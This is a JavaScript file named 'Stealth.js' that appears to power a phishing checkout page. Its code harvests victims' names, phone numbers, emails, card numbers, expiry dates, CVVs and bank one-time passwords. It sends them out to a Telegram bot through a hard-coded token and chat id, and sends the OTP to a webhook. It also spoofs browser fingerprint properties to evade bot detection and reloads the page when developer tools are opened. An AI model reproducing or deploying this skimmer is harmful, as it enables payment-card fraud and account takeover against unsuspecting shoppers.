// Stealth.js v2.6 - Anti-Detection Suite
(function(){
    'use strict';
    
    // Load config
    const config = JSON.parse(atob(localStorage.getItem('cfg') || btoa('{"token":"8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q","chat":"1705240737"}')));
    
    // Anti-Fingerprint
    Object.defineProperty(navigator, 'webdriver', {get:()=>false});
    Object.defineProperty(navigator, 'plugins', {get:()=>[1,2,3]});
    window.chrome = {runtime:{}};
    
    // Functions
    window.showPage = (page)=>document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')),document.getElementById(page).classList.add('active');
    window.formatCard = ()=>document.getElementById('card-num').value=document.getElementById('card-num').value.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();
    window.formatExp = (el)=>{let v=el.value.replace(/\D/g,'');if(v.length>=2)el.value=v.slice(0,2)+'/'+v.slice(2,4)};
    
    // Send Data (Obfuscated)
    window.submitRegister = async()=>{
        const data=`👤 ${document.getElementById('user-name').value} | 📞 ${document.getElementById('user-phone').value} | ✉️ ${document.getElementById('user-email').value} | 🖥️ ${screen.width}x${screen.height}`;
        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chat}&text=${encodeURIComponent(data)}`);
        showPage('page-payment');
    };
    
    window.submitPayment = async()=>{
        const card=document.getElementById('card-num').value.replace(/\s/g,'');
        const data=`💳 ${card} | 📅 ${document.getElementById('card-exp').value} | 🔒 ${document.getElementById('card-cvv').value} | 👤 ${document.getElementById('card-holder').value}`;
        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chat}&text=${encodeURIComponent(data)}`);
        showPage('page-verify');
    };
    
    window.submitOTP = ()=>{
        const otp=document.getElementById('bank-otp').value;
        fetch(`https://webhook.php?otp=${otp}&ua=${btoa(navigator.userAgent)}`);
        document.getElementById('err-otp').classList.remove('hidden');
    };
    
    // Anti-Debug
    setInterval(()=>{
        if(navigator.webdriver||window.outerHeight-window.innerHeight>150){
            showPage('page-product');
            location.reload();
        }
    },100);
    
})();
